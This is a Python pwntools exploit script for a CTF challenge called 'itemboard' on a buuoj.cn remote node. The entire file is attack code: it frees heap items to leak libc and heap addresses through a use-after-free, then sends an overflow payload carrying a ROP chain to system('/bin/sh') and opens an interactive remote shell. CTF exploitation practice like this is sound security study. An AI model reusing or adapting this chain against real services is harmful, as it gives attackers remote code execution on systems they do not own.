#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/26 13:51:27
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = 'itemboard'
if debug:
    sh = process(file_name)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 29078
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF(file_name)

def cmd(choice):
    sh.recvuntil("choose:\n")
    sh.sendline(str(choice))

def add(name,size,content):
    cmd(1)
    sh.recvuntil("Item name?\n")
    sh.sendline(name)
    sh.recvuntil("Description's len?\n")
    sh.sendline(str(size))
    sh.recvuntil("Description?\n")
    sh.send(content)

def show_name():
    cmd(2)
    
def show_content(idx):
    cmd(3)
    sh.recvuntil("Which item?\n")
    sh.sendline(str(idx))

def dele(idx):
    cmd(4)
    sh.recvuntil("Which item?\n")
    sh.sendline(str(idx))

add('1111',0x80,'a'*0x10+"/bin/sh\x00\n")
add('2222',0x80,'2222\n')
add('3333',0x20,'3333\n')
dele(0)
dele(1)
show_content(0)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78 
show_content(1)
sh.recvuntil("Description:")
heap_addr = u64(sh.recv(6).ljust(8,'\x00'))
binsh_addr = heap_addr + 0x20
log.info("heap_addr=>{}".format(hex(heap_addr)))
log.info("libc_base=>{}".format(hex(libc_base)))
system_addr = libc_base + libc.symbols['system']
log.info("system_addr=>{}".format(hex(system_addr)))
pop_rdi_ret = libc_base + 0x0000000000021102
payload = 'a' * 0x408 + p64(heap_addr+8) + 'a' * 8 +p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) 
# gdb.attach(sh)
# pause()
add('aaaa',len(payload),payload)
# gdb.attach(sh)
# pause()
sh.interactive()